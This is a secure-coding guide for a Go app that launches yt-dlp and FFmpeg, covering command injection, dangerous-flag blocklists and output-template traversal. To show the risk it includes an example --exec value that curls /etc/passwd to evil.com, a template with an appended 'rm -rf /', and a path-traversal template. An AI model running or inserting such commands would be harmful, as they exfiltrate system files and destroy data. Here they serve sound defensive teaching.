---
title: Command Injection Prevention
impact: CRITICAL
category: security
tags: exec, process, injection, yt-dlp, ffmpeg
---

# Command Injection Prevention

Never pass unsanitized user input through a shell or as unvalidated arguments to `exec.Command`. This app spawns yt-dlp and FFmpeg with user-controlled parameters.

## Why This Matters

This app takes URLs, file paths, and extra CLI arguments from users and passes them to external processes. A malicious input can:
- Execute arbitrary commands on the user's system
- Exfiltrate data via yt-dlp's `--exec` flag
- Overwrite files via crafted output templates
- Escalate privileges if the app runs with elevated permissions

## Attack Vectors Specific to This App

### 1. Shell Invocation

```go
// ❌ NEVER use shell invocation with user input
cmd := exec.Command("sh", "-c", "yt-dlp " + userURL)
cmd := exec.Command("cmd", "/c", "yt-dlp " + userURL)

// ✅ Pass arguments directly (Go bypasses shell)
cmd := exec.Command(ytDlpPath, "--no-exec", userURL)
```

Go's `exec.Command` passes arguments directly to the process via `execve`, not through a shell. This is safe as long as you don't explicitly invoke a shell.

### 2. Dangerous yt-dlp Flags in Extra Args

```go
// ❌ User-supplied extra args passed without validation
args := strings.Fields(settings.ExtraArgs)
cmd := exec.Command(ytDlpPath, append(safeArgs, args...)...)
// User sets ExtraArgs to: --exec "curl https://evil.com?data=$(cat /etc/passwd)"
```

```go
// ✅ Quote-aware split + blocklist dangerous flags
args := splitQuotedArgs(settings.ExtraArgs)
for _, arg := range args {
    if isDangerousFlag(arg) {
        log.Warn("Blocked dangerous flag in extra args: %s", arg)
        continue
    }
    safeArgs = append(safeArgs, arg)
}

func isDangerousFlag(arg string) bool {
    dangerous := []string{"--exec", "--exec-before-download", "--batch-file"}
    lower := strings.ToLower(arg)
    for _, d := range dangerous {
        if strings.HasPrefix(lower, d) {
            return true
        }
    }
    return false
}
```

### 3. Output Template Injection

```go
// ❌ User controls output template without validation
template := settings.OutputTemplate
args = append(args, "-o", template)
// Template: "%(title)s.%(ext)s; rm -rf /" — not dangerous via exec.Command
//   but could overwrite files: "../../../important/file.%(ext)s"
```

```go
// ✅ Validate template stays within save directory
template := settings.OutputTemplate
if strings.Contains(template, "..") || filepath.IsAbs(template) {
    template = "%(title)s.%(ext)s" // fallback to safe default
}
args = append(args, "-o", filepath.Join(saveDir, template))
```

### 4. Explorer /select Bypass

This app uses `SysProcAttr.CmdLine` to bypass Go's argument quoting for `explorer /select,<path>`. This is a known intentional bypass documented in `open_windows.go`.

```go
// This pattern is safe ONLY because:
// 1. explorer.exe is hardcoded, not user-controlled
// 2. The path comes from a completed download, not raw user input
// 3. It's documented why Go's quoting must be bypassed
//
// Do NOT use this pattern for any other command.
```

## Process Hiding Flags

```go
// ✅ Always set these for background processes (FFmpeg, yt-dlp)
cmd.SysProcAttr = &syscall.SysProcAttr{
    HideWindow:    true,
    CreationFlags: 0x08000000, // CREATE_NO_WINDOW
}

// ❌ Do NOT set these on GUI processes (explorer.exe)
// It suppresses their window entirely
```

## Best Practices

- [ ] Never invoke a shell (`sh -c`, `cmd /c`) with user input
- [ ] Blocklist dangerous yt-dlp flags (`--exec`, `--batch-file`)
- [ ] Validate output templates don't contain `..` or absolute paths
- [ ] Use `exec.CommandContext` with cancellation for all long-running processes
- [ ] Document any `SysProcAttr.CmdLine` usage with clear justification
- [ ] Log the full command args at debug level for troubleshooting
